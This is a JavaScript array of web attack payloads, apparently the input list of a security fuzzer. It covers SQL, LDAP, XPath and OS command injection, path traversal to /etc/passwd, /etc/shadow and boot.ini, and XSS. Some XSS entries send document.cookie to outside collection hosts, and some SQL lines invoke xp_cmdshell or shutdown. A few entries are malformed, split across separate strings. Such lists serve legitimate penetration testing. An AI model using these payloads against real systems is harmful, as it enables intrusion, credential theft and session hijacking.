var attackList =[
   "A:::Meta-Character Injection",
   "TRUE:::Meta-Character Injection",
   "FALSE:::Meta-Character Injection",
   "0:::Meta-Character Injection(Integer)",
   "00:::Meta-Character Injection(Integer)",
   "1:::Meta-Character Injection(Integer)",
   "-1:::Meta-Character Injection(Integer)",
   "1.0:::Meta-Character Injection(Integer)",
   "-1.0:::Meta-Character Injection(Integer)",
   "2:::Meta-Character Injection(Integer)",
   "-2:::Meta-Character Injection(Integer)",
   "-20:::Meta-Character Injection(Integer)",
   "65536:::Meta-Character Injection(Integer)",
   "268435455:::Meta-Character Injection(Integer)",
   "-268435455:::Meta-Character Injection(Integer)",
   "2147483647:::Meta-Character Injection(Integer)",
   "0xfffffff:::Meta-Character Injection",
   "NULL:::Meta-Character Injection",
   "null:::Meta-Character Injection",
   "\u0000:::Meta-Character Injection",
   "\\00:::Meta-Character Injection",
   "%0a:::Meta-Character Injection",
   "%00:::Meta-Character Injection",
   "+%00:::Meta-Character Injection",
   "\u0000:::Meta-Character Injection",
   "\u0000\u0000:::Meta-Character Injection",
   "\u0000\u0000\u0000:::Meta-Character Injection",
   "\\00:::Meta-Character Injection",
   "\\00\\00:::Meta-Character Injection",
   "\\00\\00\\00:::Meta-Character Injection",
   "$null:::Meta-Character Injection",
   "$NULL:::Meta-Character Injection",
   "%:::Meta-Character Injection",
   "#:::Meta-Character Injection",
   "*:::Meta-Character Injection",
   "}:::Meta-Character Injection",
   ";:::Meta-Character Injection",
   "/:::Meta-Character Injection",
   ":::Meta-Character Injection",
   "\\:::Meta-Character Injection",
   "\\/:::Meta-Character Injection",
   "\\\\*:::Meta-Character Injection",
   "\\\\?\\:::Meta-Character Injection",
   "|:::Meta-Character Injection",
   "`:::Meta-Character Injection",
   "-:::Meta-Character Injection",
   "--:::Meta-Character Injection",
   "*|:::Meta-Character Injection",
   "^':::Meta-Character Injection",
   "':::Meta-Character Injection",
   "/':::Meta-Character Injection",
   "@':::Meta-Character Injection",
   "('):::Meta-Character Injection",
   "{'}:::Meta-Character Injection",
   "[']:::Meta-Character Injection",
   "*':::Meta-Character Injection",
   "#':::Meta-Character Injection",
   "!':::Meta-Character Injection",
   "!@#$%%^#$%#$@#$%$$@#$%^^**(():::Meta-Character Injection",
   "%01%02%03%04%0a%0d%0aADSF:::Meta-Character Injection",
   "!@#0%^#0##018387@#0^^**(():::Meta-Character Injection",
   "%01%02%03%04%0a%0d%0aADSF:::Meta-Character Injection",
   "\t:::Meta-Character Injection",
   "\"\t\":::Meta-Character Injection",
   "&#10;:::Meta-Character Injection",
   "&#13;:::Meta-Character Injection",
   "&#10;&#13;:::Meta-Character Injection",
   "&#13;&#10;:::Meta-Character Injection",
   "#xD:::Meta-Character Injection",
   "#xA:::Meta-Character Injection",
   "#xD#xA:::Meta-Character Injection",
   "#xA#xD:::Meta-Character Injection",
   "/%00/:::Meta-Character Injection",
   "%00/:::Meta-Character Injection",
   "%00:::Meta-Character Injection",
   "<?:::Meta-Character Injection",
   "%3C%3F:::Meta-Character Injection",
   "%60:::Meta-Character Injection",
   "%5C:::Meta-Character Injection",
   "%5C/:::Meta-Character Injection",
   "%7C:::Meta-Character Injection",
   "%00:::Meta-Character Injection",
   "/%2A:::Meta-Character Injection",
   "%2A:::Meta-Character Injection",
   "%2C:::Meta-Character Injection",
   "%20:::Meta-Character Injection",
   "%20|:::Meta-Character Injection",
   "%250a:::Meta-Character Injection",
   "%2500:::Meta-Character Injection",
   "../:::Meta-Character Injection",
   "%2e%2e%2f:::Meta-Character Injection",
   "..%u2215:::Meta-Character Injection",
   "..%c0%af:::Meta-Character Injection",
   "..%bg%qf:::Meta-Character Injection",
   "..:::Meta-Character Injection",
   "..%5c:::Meta-Character Injection",
   "..%%35c:::Meta-Character Injection",
   "..%255c:::Meta-Character Injection",
   "..%%35%63:::Meta-Character Injection",
   "..%25%35%63:::Meta-Character Injection",
   "..%u2216:::Meta-Character Injection",
   "something%00html:::Meta-Character Injection",
   "&apos;:::Meta-Character Injection",
   "/&apos;:::Meta-Character Injection",
   "&apos;:::Meta-Character Injection",
   "^&apos;:::Meta-Character Injection",
   "@&apos;:::Meta-Character Injection",
   "{&apos;}:::Meta-Character Injection",
   "[&apos;]:::Meta-Character Injection",
   "*&apos;:::Meta-Character Injection",
   "#&apos;:::Meta-Character Injection",
   "\"blah:::Meta-Character Injection",
   "&quot;;id&quot;:::Meta-Character Injection",
   "id%00:::Meta-Character Injection",
   "id%00|:::Meta-Character Injection",
   "<  script > < / script>:::Meta-Character Injection",
   "\">xxx<P>yyy:::Meta-Character Injection",
   "\"><script>\":::Meta-Character Injection",
   "?x=:::Meta-Character Injection",
   "?x=\":::Meta-Character Injection",
   "?x=|:::Meta-Character Injection",
   "?x=>:::Meta-Character Injection",
   "ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|:::Meta-Character Injection",
   "/,%ENV,/:::OS Commanding",
   "&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;:::OS Commanding",
   "&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;:::OS Commanding",
   "`id`:::OS Commanding",
   ";id;:::OS Commanding",
   ";read;:::OS Commanding",
   ";netstat -a;:::OS Commanding",
   "",
   "netstat -a%",
   ":::OS Commanding",
   "|id|:::OS Commanding",
   "|id:::OS Commanding",
   "|ls:::OS Commanding",
   "|ls -la:::OS Commanding",
   ";ls -la:::OS Commanding",
   "|/bin/ls -al:::OS Commanding",
   "",
   "/bin/ls -al",
   ":::OS Commanding",
   "/index.html|id|:::OS Commanding",
   "`dir`:::Directory Indexing",
   "|dir:::Directory Indexing",
   "|dir|:::Directory Indexing",
   ";dir:::Directory Indexing",
   "%0d%0aX-Injection-Header:%20AttackValue:::Header Injection",
   "/boot.ini:::Path Traversal",
   "/etc/passwd:::Path Traversal",
   "/etc/shadow:::Path Traversal",
   "C:/inetpub/wwwroot/global.asa:::Path Traversal",
   "C:inetpubwwwrootglobal.asa:::Path Traversal",
   "C:/boot.ini:::Path Traversal",
   "C:\boot.ini:::Path Traversal",
   "../../../../../../../../../../../../etc/hosts%00:::Path Traversal",
   "../../../../../../../../../../../../etc/hosts:::Path Traversal",
   "../../boot.ini:::Path Traversal",
   "/../../../../../../../../%2A:::Path Traversal",
   "../../../../../../../../../../../../etc/passwd%00:::Path Traversal",
   "../../../../../../../../../../../../etc/passwd:::Path Traversal",
   "../../../../../../../../../../../../etc/shadow%00:::Path Traversal",
   "../../../../../../../../../../../../etc/shadow:::Path Traversal",
   "/../../../../../../../../../../etc/passwd^^:::Path Traversal",
   "/../../../../../../../../../../etc/shadow^^:::Path Traversal",
   "/../../../../../../../../../../etc/passwd:::Path Traversal",
   "/../../../../../../../../../../etc/shadow:::Path Traversal",
   "/./././././././././././etc/passwd:::Path Traversal",
   "/./././././././././././etc/shadow:::Path Traversal",
   "....................etcpasswd:::Path Traversal",
   "....................etcshadow:::Path Traversal",
   "....................etcpasswd:::Path Traversal",
   "....................etcshadow:::Path Traversal",
   "/..../..../..../..../..../..../etc/passwd:::Path Traversal",
   "/..../..../..../..../..../..../etc/shadow:::Path Traversal",
   ".\\./.\\./.\\./.\\./.\\./.\\./etc/passwd:::Path Traversal",
   ".\\./.\\./.\\./.\\./.\\./.\\./etc/shadow:::Path Traversal",
   "....................etcpasswd%00:::Path Traversal",
   "....................etcshadow%00:::Path Traversal",
   "....................etcpasswd%00:::Path Traversal",
   "....................etcshadow%00:::Path Traversal",
   "%0a/bin/cat%20/etc/passwd:::Path Traversal",
   "%0a/bin/cat%20/etc/shadow:::Path Traversal",
   "%00/etc/passwd%00:::Path Traversal",
   "%00/etc/shadow%00:::Path Traversal",
   "%00../../../../../../etc/passwd:::Path Traversal",
   "%00../../../../../../etc/shadow:::Path Traversal",
   "/../../../../../../../../../../../etc/passwd%00.jpg:::Path Traversal",
   "/../../../../../../../../../../../etc/passwd%00.html:::Path Traversal",
   "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd:::Path Traversal",
   "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow:::Path Traversal",
   "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd:::Path Traversal",
   "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow:::Path Traversal",
   "%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00:::Path Traversal",
   "/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00:::Path Traversal",
   "%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%\t25%5c..%25%5c..%00:::Path Traversal",
   "%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%\t\t25%5c..%25%5c..%255cboot.ini:::Path Traversal",
   "/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini:::Path Traversal",
   "\\&apos;/bin/cat%20/etc/passwd\\&apos;:::Path Traversal",
   "\\&apos;/bin/cat%20/etc/shadow\\&apos;:::Path Traversal",
   "../../../../../../../../conf/server.xml:::Path Traversal",
   "/../../../../../../../../bin/id|:::Path Traversal",
   "../../../../../../../../../../../../localstart.asp%00:::Path Traversal",
   "../../../../../../../../../../../../localstart.asp:::Path Traversal",
   "../../../../../../../../../../../../boot.ini%00:::Path Traversal",
   "../../../../../../../../../../../../boot.ini:::Path Traversal",
   "/./././././././././././boot.ini:::Path Traversal",
   "/../../../../../../../../../../../boot.ini%00:::Path Traversal",
   "/../../../../../../../../../../../boot.ini:::Path Traversal",
   "/..../..../..../..../..../..../boot.ini:::Path Traversal",
   "/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini:::Path Traversal",
   "....................\boot.ini:::Path Traversal",
   "....................\boot.ini%00:::Path Traversal",
   "....................\boot.ini:::Path Traversal",
   "/../../../../../../../../../../../boot.ini%00.html:::Path Traversal",
   "/../../../../../../../../../../../boot.ini%00.jpg:::Path Traversal",
   "/.../.../.../.../.../:::Path Traversal",
   "..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini:::Path Traversal",
   "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini:::Path Traversal",
   "<script>alert(\"XSS\")</script>:::XSS",
   "<script>alert(document.cookie)</script>:::XSS",
   "'><script>alert(document.cookie)</script>:::XSS",
   "'><script>alert(document.cookie);</script>:::XSS",
   "%3cscript%3ealert(\"XSS\");%3c/script%3e:::XSS",
   "%3cscript%3ealert(document.cookie);%3c%2fscript%3e:::XSS",
   "%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E:::XSS",
   "&ltscript&gtalert(document.cookie);</script>:::XSS",
   "&ltscript&gtalert(document.cookie);&ltscript&gtalert:::XSS",
   "<xss><script>alert('XSS')</script></vulnerable>:::XSS",
   "<IMG%20SRC='javascript:alert(document.cookie)'>:::XSS",
   "<IMG%20SRC='javasc\tript:alert(document.cookie)'>:::XSS",
   "<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>:::XSS",
   "'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E:::XSS",
   "\"><script>document.location='http://your.site.com/cgi-bin/cookie.cgi?'+document.cookie</script>:::XSS",
   "%3Cscript%3Enew+Image%28%29.src%3D%22http%3A%2F%2Fsec.neurofuzz-software.com%2Fe4589efff654d91e26b43333dbf41425%2Fcatch.php%3Fcookie%3D%22%2BencodeURI%28document.cookie%29%3B%3C%2Fscript%3E:::XSS",
   "%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E:::XSS",
   "<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>:::XSS",
   "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>:::XSS",
   "':::SQL Injection (SQLi)",
   "\":::SQL Injection (SQLi)",
   "#:::SQL Injection (SQLi)",
   "-:::SQL Injection (SQLi)",
   "--:::SQL Injection (SQLi)",
   "' --:::SQL Injection (SQLi)",
   "--';:::SQL Injection (SQLi)",
   "' ;:::SQL Injection (SQLi)",
   "= ':::SQL Injection (SQLi)",
   "= ;:::SQL Injection (SQLi)",
   "= --:::SQL Injection (SQLi)",
   "#:::SQL Injection (SQLi)",
   "':::SQL Injection (SQLi)",
   "= ;':::SQL Injection (SQLi)",
   "= ':::SQL Injection (SQLi)",
   "'OR SELECT *:::SQL Injection (SQLi)",
   "'or SELECT *:::SQL Injection (SQLi)",
   "'or select *:::SQL Injection (SQLi)",
   "admin'--:::SQL Injection (SQLi)",
   "';shutdown--:::SQL Injection (SQLi)",
   "<>\"'%;)(&+:::SQL Injection (SQLi)",
   "' or ''=':::SQL Injection (SQLi)",
   "' or 'x'='x:::SQL Injection (SQLi)",
   "\" or \"x\"=\"x:::SQL Injection (SQLi)",
   "') or ('x'='x:::SQL Injection (SQLi)",
   "0 or 1=1:::SQL Injection (SQLi)",
   "' or 0=0 --:::SQL Injection (SQLi)",
   "\" or 0=0 --:::SQL Injection (SQLi)",
   "or 0=0 --:::SQL Injection (SQLi)",
   "' or 0=0 #:::SQL Injection (SQLi)",
   "\" or 0=0 #:::SQL Injection (SQLi)",
   "or 0=0 #:::SQL Injection (SQLi)",
   "' or 1=1--:::SQL Injection (SQLi)",
   "\" or 1=1--:::SQL Injection (SQLi)",
   "' or '1'='1'--:::SQL Injection (SQLi)",
   "\"' or 1 --'\":::SQL Injection (SQLi)",
   "or 1=1--:::SQL Injection (SQLi)",
   "or%201=1:::SQL Injection (SQLi)",
   "or%201=1 --:::SQL Injection (SQLi)",
   "' or 1=1 or ''=':::SQL Injection (SQLi)",
   "\" or 1=1 or \"\"=\":::SQL Injection (SQLi)",
   "' or a=a--:::SQL Injection (SQLi)",
   "\" or \"a\"=\"a:::SQL Injection (SQLi)",
   "') or ('a'='a:::SQL Injection (SQLi)",
   "\") or (\"a\"=\"a:::SQL Injection (SQLi)",
   "hi\" or \"a\"=\"a:::SQL Injection (SQLi)",
   "hi\" or 1=1 --:::SQL Injection (SQLi)",
   "hi' or 1=1 --:::SQL Injection (SQLi)",
   "hi' or 'a'='a:::SQL Injection (SQLi)",
   "hi') or ('a'='a:::SQL Injection (SQLi)",
   "hi\") or (\"a\"=\"a:::SQL Injection (SQLi)",
   "'hi' or 'x'='x';:::SQL Injection (SQLi)",
   "' or 1=1 or ''=':::SQL Injection (SQLi)",
   "' or ''=':::SQL Injection (SQLi)",
   "x' or 1=1 or 'x'='y:::SQL Injection (SQLi)",
   "@variable:::SQL Injection (SQLi)",
   ",@variable:::SQL Injection (SQLi)",
   "PRINT:::SQL Injection (SQLi)",
   "PRINT @@variable:::SQL Injection (SQLi)",
   "select:::SQL Injection (SQLi)",
   "insert:::SQL Injection (SQLi)",
   "as:::SQL Injection (SQLi)",
   "or:::SQL Injection (SQLi)",
   "procedure:::SQL Injection (SQLi)",
   "limit:::SQL Injection (SQLi)",
   "order by:::SQL Injection (SQLi)",
   "asc:::SQL Injection (SQLi)",
   "desc:::SQL Injection (SQLi)",
   "delete:::SQL Injection (SQLi)",
   "update:::SQL Injection (SQLi)",
   "distinct:::SQL Injection (SQLi)",
   "having:::SQL Injection (SQLi)",
   "truncate:::SQL Injection (SQLi)",
   "replace:::SQL Injection (SQLi)",
   "like:::SQL Injection (SQLi)",
   "handler:::SQL Injection (SQLi)",
   "bfilename:::SQL Injection (SQLi)",
   "' or username like '%:::SQL Injection (SQLi)",
   "' or uname like '%:::SQL Injection (SQLi)",
   "' or userid like '%:::SQL Injection (SQLi)",
   "exec xp:::SQL Injection (SQLi)",
   "exec sp:::SQL Injection (SQLi)",
   "'; exec master..xp_cmdshell:::SQL Injection (SQLi)",
   "'; exec xp_regread:::SQL Injection (SQLi)",
   "t'exec master..xp_cmdshell 'nslookup www.google.com'--:::SQL Injection (SQLi)",
   "--sp_password:::SQL Injection (SQLi)",
   "'UNION SELECT:::SQL Injection (SQLi)",
   "' UNION SELECT:::SQL Injection (SQLi)",
   "' UNION ALL SELECT:::SQL Injection (SQLi)",
   "' or (EXISTS):::SQL Injection (SQLi)",
   "' (select top 1:::SQL Injection (SQLi)",
   "'||UTL_HTTP.REQUEST:::SQL Injection (SQLi)",
   "1;SELECT%20*:::SQL Injection (SQLi)",
   "to_timestamp_tz:::SQL Injection (SQLi)",
   "tz_offset:::SQL Injection (SQLi)",
   "&lt;&gt;&quot;'%;)(&amp;+:::SQL Injection (SQLi)",
   "'%20or%201=1:::SQL Injection (SQLi)",
   "%27%20or%201=1:::SQL Injection (SQLi)",
   "%20$(sleep%2050):::SQL Injection (SQLi)",
   "%20'sleep%2050':::SQL Injection (SQLi)",
   "char%4039%41%2b%40SELECT:::SQL Injection (SQLi)",
   "&apos;%20OR:::SQL Injection (SQLi)",
   "'sqlattempt1:::SQL Injection (SQLi)",
   "(sqlattempt2):::SQL Injection (SQLi)",
   "|:::LDAP Injection",
   "%7C:::LDAP Injection",
   "*|:::LDAP Injection",
   "%2A%7C:::LDAP Injection",
   "*(|(mail=*)):::LDAP Injection",
   "%2A%28%7C%28mail%3D%2A%29%29:::LDAP Injection",
   "*(|(objectclass=*)):::LDAP Injection",
   "%2A%28%7C%28objectclass%3D%2A%29%29:::LDAP Injection",
   "(:::LDAP Injection",
   "%28:::LDAP Injection",
   "):::LDAP Injection",
   "%29:::LDAP Injection",
   "&:::LDAP Injection",
   "%26:::LDAP Injection",
   "!:::LDAP Injection",
   "%21:::LDAP Injection",
   "/:::LDAP Injection",
   "//:::LDAP Injection",
   "//*:::LDAP Injection",
   "*/*:::LDAP Injection",
   "@*:::LDAP Injection",
   "x' or name()='username' or 'x'='y:::LDAP Injection",
   "count(/child::node()):::XPath Injection",
   "<![CDATA[<script>var n=0;while(true){n++;}</script>]]>:::Script Injection",
   "<name>','')); phpinfo(); exit;/*</name>:::Script Injection"
];




